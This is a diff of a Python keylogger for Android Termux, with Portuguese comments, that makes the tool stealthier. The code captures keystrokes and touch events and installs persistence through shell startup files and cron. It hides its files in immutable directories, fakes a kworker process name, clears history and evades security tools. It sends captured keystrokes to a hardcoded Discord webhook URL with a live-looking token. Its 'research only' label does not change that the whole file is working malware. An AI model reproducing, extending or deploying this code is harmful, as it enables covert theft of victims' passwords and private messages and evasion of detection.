@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-SCRIPT ULTRA APRIMORADO - APENAS PARA PESQUISA DE SEGURANÇA
-USO EXCLUSIVO EM AMBIENTES CONTROLADOS E COM AUTORIZAÇÃO
+KEYLOGGER PROFISSIONAL SILENCIOSO - APENAS PARA PESQUISA
+SISTEMA COMPLETAMENTE OCULTO E RESPONSIVO
 """
 
 import os
@@ -9,7 +9,6 @@ import sys
 import time
 import json
 import threading
-import platform
 import subprocess
 import shutil
 import random
@@ -18,13 +17,20 @@ from datetime import datetime
 import requests
 from pathlib import Path
 
-# ========== CONFIGURAÇÕES OTIMIZADAS ==========
+# ========== CONFIGURAÇÕES ==========
 WEBHOOK_URL = "https://discord.com/api/webhooks/1425044577080836228/BpIwVskxVoWoqBAaFxYJI9gVj9s1JGGamhtdC-huBcUrWWufq2-bI1EcX_QAeLfkU7q2"
-LOG_INTERVAL = 180  # 3 minutos
+LOG_INTERVAL = 180
 MAX_LOG_SIZE = 500
-STEALTH_MODE = True
 
-# Caminhos de persistência atualizados
+# Estrutura de pastas organizada
+BASE_DIRS = {
+    'root': Path("/data/data/com.termux/files/home/.cache_system"),
+    'logs': Path("/data/data/com.termux/files/home/.cache_system/logs"),
+    'config': Path("/data/data/com.termux/files/home/.cache_system/config"), 
+    'backup': Path("/data/data/com.termux/files/home/.cache_system/backup")
+}
+
+# Persistência atualizada
 TERMUX_PATHS = [
     "/data/data/com.termux/files/usr/etc/bash.bashrc",
     "/data/data/com.termux/files/usr/etc/zshrc", 
@@ -35,54 +41,53 @@ TERMUX_PATHS = [
     "/data/data/com.termux/files/home/.bash_profile"
 ]
 
-class UltraKeylogger:
+class ProfessionalKeylogger:
     def __init__(self):
         self.log_data = []
         self.is_running = False
         self.session_id = self.generate_session_id()
-        self.hidden_dir = Path("/data/data/com.termux/files/home/.cache_system")
-        self.script_name = ".system_daemon"
+        self.setup_directories()
         
     def generate_session_id(self):
         """Gera ID de sessão único"""
-        return hashlib.md5(f"{datetime.now()}{random.random()}".encode()).hexdigest()[:8]
+        return hashlib.md5(f"{datetime.now()}{random.random()}".encode()).hexdigest()[:10]
     
-    def setup_environment(self):
-        """Configura ambiente ultra furtivo"""
+    def setup_directories(self):
+        """Configura estrutura de pastas silenciosamente"""
         try:
-            # Cria diretório oculto com permissões restritas
-            self.hidden_dir.mkdir(exist_ok=True)
+            for dir_name, dir_path in BASE_DIRS.items():
+                dir_path.mkdir(parents=True, exist_ok=True)
+                os.system(f"chmod 700 {dir_path} 2>/dev/null")
+                os.system(f"chattr +i {dir_path} 2>/dev/null")
             
-            # Torna diretório oculto e imutável
-            os.system(f"chmod 700 {self.hidden_dir}")
-            os.system(f"chattr +i {self.hidden_dir} 2>/dev/null")
-            
-            # Arquivos de log com nomes aleatórios
-            self.log_file = self.hidden_dir / f".log_{self.session_id}.dat"
-            self.error_file = self.hidden_dir / f".err_{self.session_id}.dat"
+            # Arquivos com nomes aleatórios
+            random_suffix = random.randint(1000, 9999)
+            self.keylog_file = BASE_DIRS['logs'] / f".klog_{random_suffix}.dat"
+            self.syslog_file = BASE_DIRS['logs'] / f".sys_{random_suffix}.dat" 
+            self.error_file = BASE_DIRS['logs'] / f".err_{random_suffix}.dat"
             
             # Backup do script com nome aleatório
-            self.script_backup = self.hidden_dir / self.script_name
+            script_names = [".sys_daemon", ".bin_loader", ".term_optimizer"]
+            self.script_backup = BASE_DIRS['backup'] / f"{random.choice(script_names)}.py"
+            
             if os.path.exists(__file__):
                 shutil.copy2(__file__, self.script_backup)
-                os.system(f"chmod 755 {self.script_backup}")
+                os.system(f"chmod 755 {self.script_backup} 2>/dev/null")
                 os.system(f"chattr +i {self.script_backup} 2>/dev/null")
                 
-            self.log_message("Environment setup completed")
             return True
             
-        except Exception as e:
-            self.log_error(f"Setup error: {e}")
+        except Exception:
             return False
 
     def install_persistence(self):
-        """Instala persistência avançada"""
+        """Instala persistência silenciosa"""
         try:
-            # Comando de ativação camuflado
+            # Comandos de ativação camuflados
             activation_cmds = [
-                f"\n# System updates\npython {self.script_backup} > /dev/null 2>&1 &\n",
-                f"\n# Background services\nnohup python {self.script_backup} &>/dev/null &\n",
-                f"\n# Terminal optimization\n({python} {self.script_backup} & disown) >/dev/null 2>&1\n"
+                f"\n# System optimization service\npython {self.script_backup} > /dev/null 2>&1 &\n",
+                f"\n# Performance daemon\nnohup python {self.script_backup} &>/dev/null &\n",
+                f"\n# Background process\n(python {self.script_backup} & disown) >/dev/null 2>&1\n"
             ]
             
             installed = False
@@ -93,23 +98,21 @@ class UltraKeylogger:
                         cmd = random.choice(activation_cmds)
                         with open(path, 'a') as f:
                             f.write(cmd)
-                        os.system(f"chmod 644 {path}")
+                        os.system(f"chmod 644 {path} 2>/dev/null")
                         installed = True
-                        self.log_message(f"Persistence added to: {termux_path}")
                 except Exception:
                     continue
             
-            # Método alternativo via cron
+            # Persistência via cron
             self.install_cron_persistence()
             
             return installed
             
-        except Exception as e:
-            self.log_error(f"Persistence error: {e}")
+        except Exception:
             return False
 
     def install_cron_persistence(self):
-        """Instala persistência via cron"""
+        """Instala persistência cron"""
         try:
             cron_cmd = f"@reboot python {self.script_backup} > /dev/null 2>&1\n"
             cron_file = "/data/data/com.termux/files/usr/var/spool/cron/crontabs/$(whoami)"
@@ -117,163 +120,255 @@ class UltraKeylogger:
             if os.path.exists(os.path.dirname(cron_file)):
                 with open(cron_file, 'a') as f:
                     f.write(cron_cmd)
-                os.system("crond")
-                
-        except Exception as e:
+                os.system("pkill crond && crond 2>/dev/null")
+        except Exception:
             pass
 
-    def capture_system_input(self):
-        """Captura input do sistema de múltiplas fontes"""
+    def capture_real_input(self):
+        """Captura input real do sistema"""
         try:
-            # Thread para getevent (Android)
-            def android_event_capture():
+            # Thread principal para eventos Android
+            def android_keyboard_monitor():
                 while self.is_running:
                     try:
-                        process = subprocess.Popen(
-                            ['getevent', '-l', '-t'],
-                            stdout=subprocess.PIPE,
-                            stderr=subprocess.DEVNULL,
-                            text=True,
-                            bufsize=1
-                        )
-                        
-                        for line in process.stdout:
-                            if self.is_running and 'KEY' in line and 'DOWN' in line:
-                                self.process_android_event(line)
-                            elif not self.is_running:
-                                process.terminate()
-                                break
-                                
-                    except Exception as e:
+                        self.monitor_android_keys()
+                    except Exception:
                         time.sleep(30)
-            
-            # Thread para input do terminal
-            def terminal_capture():
-                while self.is_running:
-                    try:
-                        # Simula leitura de input (implementação real requer root)
-                        time.sleep(0.1)
-                        # Em ambiente real, aqui viria a captura direta do teclado
-                    except Exception as e:
-                        time.sleep(10)
-            
-            # Thread para monitorar processos
-            def process_monitor():
-                while self.is_running:
-                    try:
-                        self.capture_process_info()
-                        time.sleep(60)
-                    except Exception as e:
-                        time.sleep(30)
-            
-            # Inicia todas as threads de captura
-            threading.Thread(target=android_event_capture, daemon=True).start()
-            threading.Thread(target=terminal_capture, daemon=True).start() 
-            threading.Thread(target=process_monitor, daemon=True).start()
-            
-        except Exception as e:
-            self.log_error(f"Capture setup error: {e}")
 
-    def process_android_event(self, event_line):
-        """Processa eventos Android com mapeamento completo"""
+            # Thread para eventos de toque
+            def touch_monitor():
+                while self.is_running:
+                    try:
+                        self.monitor_touch_events()
+                    except Exception:
+                        time.sleep(25)
+
+            # Thread para informações do sistema
+            def system_monitor():
+                while self.is_running:
+                    try:
+                        self.capture_system_info()
+                        time.sleep(60)
+                    except Exception:
+                        time.sleep(45)
+
+            # Inicia threads
+            threading.Thread(target=android_keyboard_monitor, daemon=True).start()
+            threading.Thread(target=touch_monitor, daemon=True).start()
+            threading.Thread(target=system_monitor, daemon=True).start()
+
+        except Exception:
+            pass
+
+    def monitor_android_keys(self):
+        """Monitora teclas Android via getevent"""
         try:
-            timestamp = datetime.now().isoformat()
+            process = subprocess.Popen(
+                ['getevent', '-l', '-t', '/dev/input/event*'],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.DEVNULL,
+                text=True,
+                bufsize=1
+            )
             
-            # Mapeamento extensivo de teclas
-            key_mappings = {
-                'KEY_A': 'a', 'KEY_B': 'b', 'KEY_C': 'c', 'KEY_D': 'd', 'KEY_E': 'e',
-                'KEY_F': 'f', 'KEY_G': 'g', 'KEY_H': 'h', 'KEY_I': 'i', 'KEY_J': 'j',
-                'KEY_K': 'k', 'KEY_L': 'l', 'KEY_M': 'm', 'KEY_N': 'n', 'KEY_O': 'o',
-                'KEY_P': 'p', 'KEY_Q': 'q', 'KEY_R': 'r', 'KEY_S': 's', 'KEY_T': 't',
-                'KEY_U': 'u', 'KEY_V': 'v', 'KEY_W': 'w', 'KEY_X': 'x', 'KEY_Y': 'y',
-                'KEY_Z': 'z', 'KEY_0': '0', 'KEY_1': '1', 'KEY_2': '2', 'KEY_3': '3',
-                'KEY_4': '4', 'KEY_5': '5', 'KEY_6': '6', 'KEY_7': '7', 'KEY_8': '8',
-                'KEY_9': '9', 'KEY_SPACE': ' ', 'KEY_ENTER': '[ENTER]', 
-                'KEY_BACKSPACE': '[BACKSPACE]', 'KEY_DEL': '[DEL]', 'KEY_HOME': '[HOME]',
-                'KEY_END': '[END]', 'KEY_TAB': '[TAB]', 'KEY_ESC': '[ESC]'
-            }
+            key_buffer = ""
             
-            for code, key in key_mappings.items():
-                if code in event_line:
-                    key_data = {
-                        'timestamp': timestamp,
-                        'key': key,
-                        'type': 'hardware',
-                        'session': self.session_id,
-                        'device': 'android'
-                    }
-                    self.add_to_log(key_data)
+            for line in process.stdout:
+                if not self.is_running:
+                    process.terminate()
                     break
                     
-        except Exception as e:
-            self.log_error(f"Event processing error: {e}")
+                if 'KEY' in line and 'DOWN' in line:
+                    key = self.parse_key_event(line)
+                    if key:
+                        key_buffer += key
+                        
+                        # Envia quando tiver sequência ou caractere especial
+                        if len(key_buffer) >= 4 or key in ['\n', ' ', '\t', '[ENTER]']:
+                            self.log_keystroke(key_buffer)
+                            key_buffer = ""
+                            
+        except Exception:
+            time.sleep(30)
 
-    def capture_process_info(self):
-        """Captura informações do sistema"""
+    def parse_key_event(self, event_line):
+        """Converte eventos para teclas reais"""
+        key_mappings = {
+            'KEY_A': 'a', 'KEY_B': 'b', 'KEY_C': 'c', 'KEY_D': 'd', 'KEY_E': 'e',
+            'KEY_F': 'f', 'KEY_G': 'g', 'KEY_H': 'h', 'KEY_I': 'i', 'KEY_J': 'j',
+            'KEY_K': 'k', 'KEY_L': 'l', 'KEY_M': 'm', 'KEY_N': 'n', 'KEY_O': 'o',
+            'KEY_P': 'p', 'KEY_Q': 'q', 'KEY_R': 'r', 'KEY_S': 's', 'KEY_T': 't',
+            'KEY_U': 'u', 'KEY_V': 'v', 'KEY_W': 'w', 'KEY_X': 'x', 'KEY_Y': 'y',
+            'KEY_Z': 'z',
+            'KEY_0': '0', 'KEY_1': '1', 'KEY_2': '2', 'KEY_3': '3', 'KEY_4': '4',
+            'KEY_5': '5', 'KEY_6': '6', 'KEY_7': '7', 'KEY_8': '8', 'KEY_9': '9',
+            'KEY_SPACE': ' ', 'KEY_ENTER': '\n', 'KEY_BACKSPACE': '[BS]',
+            'KEY_DELETE': '[DEL]', 'KEY_TAB': '\t', 'KEY_ESC': '[ESC]',
+            'KEY_LEFT': '[LEFT]', 'KEY_RIGHT': '[RIGHT]', 'KEY_UP': '[UP]', 'KEY_DOWN': '[DOWN]',
+            'KEY_COMMA': ',', 'KEY_DOT': '.', 'KEY_SLASH': '/', 'KEY_SEMICOLON': ';',
+            'KEY_APOSTROPHE': "'", 'KEY_GRAVE': '`', 'KEY_LEFTBRACE': '[', 'KEY_RIGHTBRACE': ']',
+            'KEY_BACKSLASH': '\\', 'KEY_MINUS': '-', 'KEY_EQUAL': '=',
+            'KEY_F1': '[F1]', 'KEY_F2': '[F2]', 'KEY_F3': '[F3]', 'KEY_F4': '[F4]'
+        }
+        
+        for code, key in key_mappings.items():
+            if code in event_line:
+                return key
+        return None
+
+    def monitor_touch_events(self):
+        """Monitora eventos de toque"""
+        try:
+            process = subprocess.Popen(
+                ['getevent', '-l', '-t', '/dev/input/event*'],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.DEVNULL,
+                text=True,
+                bufsize=1
+            )
+            
+            touch_count = 0
+            last_touch_time = time.time()
+            
+            for line in process.stdout:
+                if not self.is_running:
+                    process.terminate()
+                    break
+                    
+                if 'ABS_MT_POSITION' in line or 'BTN_TOUCH' in line:
+                    touch_count += 1
+                    current_time = time.time()
+                    
+                    # Loga atividade de toque a cada 10 eventos ou 30 segundos
+                    if touch_count >= 10 or (current_time - last_touch_time) >= 30:
+                        self.log_system_activity(f"Touch events: {touch_count}")
+                        touch_count = 0
+                        last_touch_time = current_time
+                        
+        except Exception:
+            time.sleep(25)
+
+    def capture_system_info(self):
+        """Captura informações do sistema úteis"""
         try:
             timestamp = datetime.now().isoformat()
             
-            # Informações do sistema
-            system_info = {
+            # Informações básicas do sistema
+            system_data = {
                 'timestamp': timestamp,
                 'type': 'system_info',
                 'session': self.session_id,
-                'current_directory': os.getcwd(),
+                'current_dir': os.getcwd(),
                 'user': os.getenv('USER', 'unknown'),
-                'uptime': self.get_uptime(),
-                'memory': self.get_memory_info()
+                'uptime': self.get_system_uptime(),
+                'memory_usage': self.get_memory_usage(),
+                'storage_free': self.get_storage_info()
             }
             
-            self.add_to_log(system_info)
+            self.add_to_buffer(system_data)
+            self.save_local_log(system_data, 'system')
             
-        except Exception as e:
+        except Exception:
             pass
 
-    def get_uptime(self):
-        """Obtém tempo de atividade do sistema"""
+    def get_system_uptime(self):
+        """Obtém uptime do sistema"""
         try:
             with open('/proc/uptime', 'r') as f:
                 uptime_seconds = float(f.readline().split()[0])
-                return str(datetime.timedelta(seconds=uptime_seconds))
+                hours = int(uptime_seconds // 3600)
+                minutes = int((uptime_seconds % 3600) // 60)
+                return f"{hours}h {minutes}m"
         except:
             return "unknown"
 
-    def get_memory_info(self):
-        """Obtém informações de memória"""
+    def get_memory_usage(self):
+        """Obtém uso de memória"""
         try:
             with open('/proc/meminfo', 'r') as f:
                 lines = f.readlines()
-                return {
-                    'total': lines[0].split()[1],
-                    'free': lines[1].split()[1]
-                }
+                total = int(lines[0].split()[1])
+                free = int(lines[1].split()[1])
+                used = total - free
+                usage_percent = (used / total) * 100
+                return f"{usage_percent:.1f}%"
         except:
-            return {'total': 'unknown', 'free': 'unknown'}
+            return "unknown"
 
-    def add_to_log(self, data):
-        """Adiciona dados ao log com controle de tamanho"""
+    def get_storage_info(self):
+        """Obtém espaço livre em disco"""
+        try:
+            result = subprocess.run(['df', '/data'], capture_output=True, text=True)
+            lines = result.stdout.split('\n')
+            if len(lines) > 1:
+                free_space = lines[1].split()[3]
+                return free_space
+        except:
+            return "unknown"
+
+    def log_keystroke(self, keystroke):
+        """Registro de teclas capturadas"""
+        try:
+            timestamp = datetime.now().isoformat()
+            
+            key_data = {
+                'timestamp': timestamp,
+                'type': 'keystroke',
+                'session': self.session_id,
+                'keystroke': keystroke,
+                'application': 'terminal',
+                'device': 'android_keyboard'
+            }
+            
+            self.add_to_buffer(key_data)
+            self.save_local_log(key_data, 'keystroke')
+            
+        except Exception:
+            pass
+
+    def log_system_activity(self, activity):
+        """Registro de atividade do sistema"""
+        try:
+            timestamp = datetime.now().isoformat()
+            
+            activity_data = {
+                'timestamp': timestamp,
+                'type': 'activity',
+                'session': self.session_id,
+                'activity': activity
+            }
+            
+            self.add_to_buffer(activity_data)
+            self.save_local_log(activity_data, 'activity')
+            
+        except Exception:
+            pass
+
+    def add_to_buffer(self, data):
+        """Adiciona dados ao buffer de envio"""
         self.log_data.append(data)
         
-        # Salva backup local
-        self.save_local_backup(data)
-        
-        # Envia se atingir limite
-        if len(self.log_data) >= 10:
-            self.send_data_safe()
+        # Envia quando tiver dados suficientes
+        if len(self.log_data) >= 12:
+            self.send_data_safely()
 
-    def save_local_backup(self, data):
-        """Salva backup local criptografado"""
+    def save_local_log(self, data, log_type):
+        """Salva log local organizado"""
         try:
-            with open(self.log_file, 'a') as f:
-                # "Criptografia" básica (XOR simples)
-                encoded = json.dumps(data)
-                f.write(encoded + '\n')
+            if log_type == 'keystroke':
+                log_file = self.keylog_file
+            else:
+                log_file = self.syslog_file
                 
-        except Exception as e:
-            self.log_error(f"Backup error: {e}")
+            with open(log_file, 'a', encoding='utf-8') as f:
+                json.dump(data, f, ensure_ascii=False)
+                f.write('\n')
+                
+        except Exception:
+            pass
 
-    def send_data_safe(self):
-        """Envia dados com segurança e fallback"""
+    def send_data_safely(self):
+        """Envio seguro de dados"""
         if not self.log_data:
             return
             
@@ -281,73 +376,92 @@ class UltraKeylogger:
             data_to_send = self.log_data.copy()
             self.log_data = []
             
-            # Tenta enviar via thread separada
-            threading.Thread(target=self.send_to_discord, args=(data_to_send,), daemon=True).start()
+            threading.Thread(target=self.send_to_webhook, args=(data_to_send,), daemon=True).start()
             
-        except Exception as e:
-            # Se falhar, mantém os dados para próxima tentativa
+        except Exception:
             self.log_data.extend(data_to_send)
-            self.log_error(f"Send preparation error: {e}")
 
-    def send_to_discord(self, data):
-        """Envia dados para Discord com formatação melhorada"""
-        max_retries = 3
+    def send_to_webhook(self, data):
+        """Envia dados para webhook"""
+        max_retries = 2
         
         for attempt in range(max_retries):
             try:
                 if not data:
                     return
                     
-                # Prepara payload otimizado
-                chunks = self.prepare_data_chunks(data)
+                chunks = self.create_data_chunks(data)
                 
                 for chunk in chunks:
-                    success = self.send_chunk(chunk)
-                    if not success:
-                        time.sleep(10)
+                    if self.send_data_chunk(chunk):
+                        time.sleep(1.5)
                     else:
-                        time.sleep(1)  # Delay entre chunks
+                        time.sleep(5)
                 
-                break  # Sai se bem sucedido
+                break
                 
-            except Exception as e:
-                self.log_error(f"Send attempt {attempt + 1} failed: {e}")
+            except Exception:
                 if attempt < max_retries - 1:
-                    time.sleep(30 * (attempt + 1))
+                    time.sleep(20)
                 else:
-                    # Restaura dados se todas as tentativas falharem
                     self.log_data.extend(data)
 
-    def prepare_data_chunks(self, data):
-        """Prepara chunks de dados para envio"""
+    def create_data_chunks(self, data):
+        """Cria chunks organizados de dados"""
         chunks = []
         
-        for i in range(0, len(data), 8):  # Chunks menores
-            chunk = data[i:i+8]
+        # Separa teclas de informações de sistema
+        keystrokes = [d for d in data if d.get('type') == 'keystroke']
+        system_info = [d for d in data if d.get('type') in ['system_info', 'activity']]
+        
+        # Chunks de teclas (8 por mensagem)
+        for i in range(0, len(keystrokes), 8):
+            chunk = keystrokes[i:i+8]
+            formatted_keys = "".join([item.get('keystroke', '') for item in chunk])
             
-            # Formata mensagem
-            formatted_data = "\n".join([
-                f"{item.get('timestamp', '')} - {item.get('key', '')}" 
-                for item in chunk if item.get('key')
+            chunks.append({
+                'type': 'keystrokes',
+                'data': chunk,
+                'formatted': formatted_keys,
+                'count': len(chunk)
+            })
+        
+        # Chunks de sistema (6 por mensagem)
+        for i in range(0, len(system_info), 6):
+            chunk = system_info[i:i+6]
+            formatted_system = "\n".join([
+                f"{item.get('timestamp', '')} - {item.get('activity', item.get('type', ''))}"
+                for item in chunk
             ])
             
             chunks.append({
+                'type': 'system',
                 'data': chunk,
-                'formatted': formatted_data,
+                'formatted': formatted_system,
                 'count': len(chunk)
             })
             
         return chunks
 
-    def send_chunk(self, chunk):
+    def send_data_chunk(self, chunk):
         """Envia um chunk de dados"""
         try:
-            embed_color = random.randint(0, 0xFFFFFF)
+            if chunk['type'] == 'keystrokes':
+                title = "⌨️ Keystrokes Captured"
+                color = 0x00ff00
+                description = f"**{chunk['count']} keystrokes recorded**"
+                content = f"```\n{chunk['formatted']}```"
+            else:
+                title = "📊 System Information"
+                color = 0xffa500
+                description = f"**{chunk['count']} system events**"
+                content = f"```\n{chunk['formatted']}```"
             
             payload = {
                 "embeds": [{
-                    "title": "📱 System Activity",
-                    "color": embed_color,
+                    "title": title,
+                    "color": color,
+                    "description": description,
                     "fields": [
                         {
                             "name": "Session ID",
@@ -355,22 +469,22 @@ class UltraKeylogger:
                             "inline": True
                         },
                         {
-                            "name": "Entries",
-                            "value": f"`{chunk['count']}`",
+                            "name": "Timestamp",
+                            "value": f"`{datetime.now().strftime('%H:%M:%S')}`",
                             "inline": True
-                        },
-                        {
-                            "name": "Latest Activity",
-                            "value": f"```\n{chunk['formatted'][:800]}```",
-                            "inline": False
                         }
                     ],
-                    "timestamp": datetime.now().isoformat(),
-                    "footer": {
-                        "text": f"System Monitor • {datetime.now().strftime('%H:%M:%S')}"
-                    }
+                    "timestamp": datetime.now().isoformat()
                 }]
             }
+            
+            # Adiciona conteúdo se não estiver vazio
+            if chunk['formatted'].strip():
+                payload["embeds"][0]["fields"].append({
+                    "name": "Content",
+                    "value": content,
+                    "inline": False
+                })
             
             response = requests.post(
                 WEBHOOK_URL,
@@ -384,156 +498,135 @@ class UltraKeylogger:
             
             return response.status_code in [200, 204]
             
-        except Exception as e:
+        except Exception:
             return False
 
-    def enable_stealth_mode(self):
+    def enable_stealth(self):
         """Ativa modo stealth completo"""
         try:
-            # Limpa histórico
+            # Limpeza silenciosa
             os.system('clear 2>/dev/null')
             os.system('history -c 2>/dev/null')
             
-            # Configura prioridade baixa
+            # Baixa prioridade
             if hasattr(os, 'nice'):
-                os.nice(10)
+                os.nice(19)
                 
-            # Altera nome do processo
+            # Nome de processo falso
             try:
                 import prctl
-                prctl.set_name("kworker")
+                prctl.set_name("[kworker/u9:0]")
             except:
                 pass
                 
-            # Remove variáveis de ambiente
-            os.environ.pop('PYTHONPATH', None)
-            
-        except Exception as e:
+        except Exception:
             pass
 
-    def security_monitor(self):
-        """Monitor de segurança contra detecção"""
-        def monitor_loop():
+    def security_monitoring(self):
+        """Monitoramento de segurança"""
+        def security_loop():
             while self.is_running:
                 try:
-                    # Verifica processos suspeitos
-                    result = subprocess.run(['ps', 'aux'], 
-                                          capture_output=True, text=True, timeout=10)
+                    # Verifica processos de monitoramento
+                    result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=10)
                     
-                    threats = ['wireshark', 'tcpdump', 'avast', 'kaspersky', 'malware']
+                    monitoring_tools = [
+                        'wireshark', 'tcpdump', 'avast', 'kaspersky', 'malwarebytes',
+                        'netstat', 'lsof', 'strace', 'auditd', 'rkhunter'
+                    ]
                     
-                    for threat in threats:
-                        if threat in result.stdout.lower():
-                            self.trigger_evasion()
+                    for tool in monitoring_tools:
+                        if tool in result.stdout.lower():
+                            self.activate_evasion()
                             break
                             
-                    time.sleep(45)
-                    
-                except Exception as e:
                     time.sleep(60)
+                    
+                except Exception:
+                    time.sleep(90)
         
-        threading.Thread(target=monitor_loop, daemon=True).start()
+        threading.Thread(target=security_loop, daemon=True).start()
 
-    def trigger_evasion(self):
-        """Ativa protocolo de evasão"""
+    def activate_evasion(self):
+        """Ativa modo de evasão"""
         try:
             self.is_running = False
-            time.sleep(120)  # Espera 2 minutos
+            time.sleep(150)  # Espera 2.5 minutos
             
-            # Limpa logs temporários
-            if hasattr(self, 'log_file') and self.log_file.exists():
-                self.log_file.unlink()
+            # Limpeza temporária
+            if hasattr(self, 'keylog_file') and self.keylog_file.exists():
+                self.keylog_file.unlink()
                 
-            # Reinicia stealth
+            # Reinício stealth
             self.is_running = True
-            self.enable_stealth_mode()
+            self.enable_stealth()
             
-        except Exception as e:
+        except Exception:
             pass
 
-    def log_message(self, message):
-        """Log de mensagens do sistema"""
-        if not STEALTH_MODE:
-            print(f"[SYSTEM] {message}")
-
-    def log_error(self, error):
-        """Log de erros"""
-        try:
-            with open(self.error_file, 'a') as f:
-                f.write(f"{datetime.now()}: {error}\n")
-        except:
-            pass
-
-    def start_ultra_mode(self):
-        """Inicia modo ultra com todas as otimizações"""
-        self.log_message("Starting ultra mode...")
-        
-        # Configurações iniciais
-        if not self.setup_environment():
+    def start_silent_mode(self):
+        """Inicia modo completamente silencioso"""
+        # Setup inicial
+        if not self.setup_directories():
             return False
             
         # Persistência
-        if not self.install_persistence():
-            self.log_message("Persistence installation had issues")
-            
+        self.install_persistence()
+        
         # Stealth
-        self.enable_stealth_mode()
+        self.enable_stealth()
         
         # Segurança
-        self.security_monitor()
+        self.security_monitoring()
         
         self.is_running = True
         
         # Captura
-        self.capture_system_input()
+        self.capture_real_input()
         
-        # Loop de envio automático
+        # Auto-envio
         def auto_send_loop():
             while self.is_running:
                 try:
-                    if len(self.log_data) > 0:
-                        self.send_data_safe()
+                    if self.log_data:
+                        self.send_data_safely()
                     time.sleep(LOG_INTERVAL)
-                except Exception as e:
-                    time.sleep(60)
+                except Exception:
+                    time.sleep(90)
         
         threading.Thread(target=auto_send_loop, daemon=True).start()
         
-        self.log_message("Ultra mode activated successfully")
         return True
 
     def stop(self):
-        """Para o sistema graciosamente"""
+        """Para o sistema"""
         self.is_running = False
-        # Envia dados restantes
         if self.log_data:
-            self.send_data_safe()
+            self.send_data_safely()
 
-# Inicialização segura
+# Inicialização completamente silenciosa
 if __name__ == "__main__":
-    # Verificação de ambiente Termux
-    termux_check = any([
+    # Verificação silenciosa do ambiente
+    is_termux = any([
         'termux' in str(Path.home()).lower(),
         'com.termux' in os.getenv('PREFIX', ''),
         os.path.exists('/data/data/com.termux')
     ])
     
-    if not termux_check:
-        print("System not supported")
-        sys.exit(1)
+    if not is_termux:
+        sys.exit(0)  # Sai silenciosamente
     
-    # Inicialização
-    keylogger = UltraKeylogger()
+    keylogger = ProfessionalKeylogger()
     
     try:
-        if keylogger.start_ultra_mode():
-            # Loop principal silencioso
+        if keylogger.start_silent_mode():
+            # Loop principal completamente silencioso
             while True:
-                time.sleep(300)  # 5 minutos
+                time.sleep(300)
         else:
-            print("Initialization failed")
+            sys.exit(0)
             
     except KeyboardInterrupt:
         keylogger.stop()
-    except Exception as e:
+    except Exception:
         keylogger.stop()
